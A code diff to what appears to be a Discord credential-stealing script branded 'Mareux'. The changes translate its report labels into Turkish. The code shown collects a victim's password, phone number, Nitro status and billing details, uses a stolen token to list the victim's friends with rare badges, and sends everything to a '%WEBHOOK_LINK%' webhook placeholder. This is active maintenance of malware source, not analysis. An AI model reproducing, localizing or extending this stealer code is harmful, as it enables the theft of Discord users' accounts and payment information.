@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "Mareux",
+    brand: "mareux",
 
     webhook: "%WEBHOOK_LINK%",
 
@@ -427,13 +427,13 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "Password",
+                        name: "Sifre",
                         value: `\`\`\`${password}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "Phone Number",
-                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
+                        name: "Telefon Numarasi",
+                        value: `\`\`\`${userInfo.phone ?? "Yok"}\`\`\``,
                         inline: false
                     },
                     {
@@ -441,7 +441,7 @@ var event_handlers = {
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: false
                     }, {
-                        name: "Billing",
+                        name: "Ödeme",
                         value: `${billing}`,
                         inline: true
                     }, {
@@ -636,6 +636,7 @@ async function getRelationships(token) {
             rareBadgesFriends += b + ` | ${z.user.username}#${z.user.discriminator}\n`
         }
     }
+
     if (!rareBadgesFriends) rareBadgesFriends = "Nadir Arkadaş Yok"
 
     return {
